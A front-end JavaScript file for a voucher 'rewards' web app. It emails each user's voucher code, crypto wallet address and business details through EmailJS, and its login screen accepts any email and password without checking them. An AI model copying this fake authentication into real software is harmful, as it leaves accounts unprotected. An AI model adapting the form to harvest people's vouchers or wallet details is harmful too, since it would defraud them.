// Initialize EmailJS
emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID

// Navigation Handlers
function resetFields() {
  document.querySelectorAll("input").forEach((input) => (input.value = ""));
}

// Navigate to Sign-Up
document.getElementById("go-to-sign-up").addEventListener("click", () => {
  resetFields();
  document.getElementById("login-screen").classList.add("hidden");
  document.getElementById("sign-up-screen").classList.remove("hidden");
});

// Back Button Handlers
document.querySelectorAll(".back-btn").forEach((button) => {
  button.addEventListener("click", () => {
    resetFields();
    document.querySelectorAll(".screen").forEach((screen) => screen.classList.add("hidden"));
    document.getElementById("login-screen").classList.remove("hidden");
  });
});

// Sign-Up Handler
document.getElementById("sign-up-btn").addEventListener("click", () => {
  const name = document.getElementById("sign-up-name").value;
  const email = document.getElementById("sign-up-email").value;

  if (name && email) {
    alert("Sign-Up Successful!");
    document.getElementById("name-display").value = name;
    document.getElementById("email-display").value = email;

    resetFields();
    document.getElementById("sign-up-screen").classList.add("hidden");
    document.getElementById("rewards-screen").classList.remove("hidden");
  } else {
    alert("Please fill in all fields.");
  }
});

// Rewards Submission Handler
document.getElementById("submit-reward-btn").addEventListener("click", () => {
  const name = document.getElementById("name-display").value;
  const email = document.getElementById("email-display").value;
  const voucherCode = document.getElementById("voucher-code").value;
  const walletAddress = document.getElementById("wallet-address").value;
  const businessName = document.getElementById("business-name").value;
  const businessEmail = document.getElementById("business-email").value;

  if (name && email && voucherCode && walletAddress && businessName && businessEmail) {
    // Update transaction details
    document.getElementById("transaction-name").textContent = name;
    document.getElementById("transaction-email").textContent = email;
    document.getElementById("transaction-voucher-code").textContent = voucherCode;
    document.getElementById("transaction-wallet").textContent = walletAddress;
    document.getElementById("transaction-business-name").textContent = businessName;
    document.getElementById("transaction-business-email").textContent = businessEmail;

    // Send email
    const emailData = {
      customerName: name,
      customerEmail: email,
      voucherCode: voucherCode,
      walletAddress: walletAddress,
      businessName: businessName,
      businessEmail: businessEmail,
    };

    emailjs.send("service_ydsiil8", "template_y0f3pw9", emailData).then(
      (response) => {
        console.log("SUCCESS!", response.status, response.text);
        alert("Your reward submission has been sent successfully!");
      },
      (error) => {
        console.error("FAILED...", error);
        alert("Failed to send your reward submission. Please try again.");
      }
    );

    // Navigate to Transaction Screen
    resetFields();
    document.getElementById("rewards-screen").classList.add("hidden");
    document.getElementById("transaction-screen").classList.remove("hidden");
  } else {
    alert("Please fill in all fields.");
  }
});

// Login Handler
document.getElementById("login-btn").addEventListener("click", () => {
  const email = document.getElementById("login-email").value;
  const password = document.getElementById("login-password").value;

  if (email && password) {
    alert("Login Successful");
    resetFields();
    document.getElementById("login-screen").classList.add("hidden");
    document.getElementById("rewards-screen").classList.remove("hidden");
  } else {
    alert("Please enter both email and password.");
  }
});
